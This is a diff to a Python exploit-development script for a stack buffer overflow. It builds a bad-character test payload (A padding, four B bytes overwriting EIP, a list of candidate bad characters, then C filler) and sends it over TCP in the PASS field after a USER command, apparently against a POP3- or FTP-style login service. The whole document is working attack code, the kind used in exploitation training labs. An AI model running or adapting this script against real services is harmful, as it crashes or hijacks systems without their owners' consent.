@@ -58,13 +58,13 @@ l_bad_chars = (
 for l_byte in l_chars_to_supress:
     l_bad_chars = l_bad_chars.replace(chr(l_byte), '')
 
-l_bytes_before_EIP: int = l_offset_eip - len(l_bad_chars)
+l_bytes_before_EIP: int = l_offset_eip
 l_size_of_EIP: int = 4
-l_bytes_after_EIP: int = l_total_payload_size - (l_offset_eip + l_size_of_EIP)
+l_bytes_after_EIP: int = l_total_payload_size - (l_offset_eip + l_size_of_EIP + len(l_bad_chars))
 l_a = "A" * l_bytes_before_EIP
 l_b = "B" * l_size_of_EIP
 l_c = "C" * l_bytes_after_EIP
-l_pattern = l_a.encode() + bytes(l_bad_chars, encoding='iso-8859-1') + l_b.encode() + l_c.encode()
+l_pattern = l_a.encode() + l_b.encode() + bytes(l_bad_chars, encoding='iso-8859-1') + l_c.encode()
 
 try:
     # Create a TCP (socket)
@@ -76,17 +76,30 @@ except:
     print("Could not connect to {} port {}".format(l_rhost, l_rport))
     exit(0)
 
+time.sleep(2)
+
 try:
     # Send the message via the socket using the specific protocol
-    # Example:
-    # l_bytes = b'\x11' + '(setup sound '.encode() + l_pattern + b'\x90\x00' + '#'.encode()
-    l_bytes = '<YOUR PROTOCOL HERE>'
-    print("Sending payload of length {}".format(len(l_bytes)))
+    print("Sending USER parameter")
+    l_bytes = 'USER jeremy\r\n'.encode()
     s.send(l_bytes)
     data = s.recv(1024)
     print("Data received: {}".format(data))
-except Exception as e:
-    print("Could not send payload: {}".format(e))
+except:
+    print("Could not send USER parameter")
 
-time.sleep(1)
+time.sleep(2)
+
+try:
+    # Send the message via the socket using the specific protocol
+    print("Sending PASS parameter of length {}".format(len(l_pattern)))
+    l_bytes = 'PASS '.encode() + l_pattern + '\r\n'.encode()
+    s.send(l_bytes)
+    data = s.recv(1024)
+    print("Data received: {}".format(data))
+except:
+    print("Could not send PASS parameter")
+
+time.sleep(2)
+
 s.close()
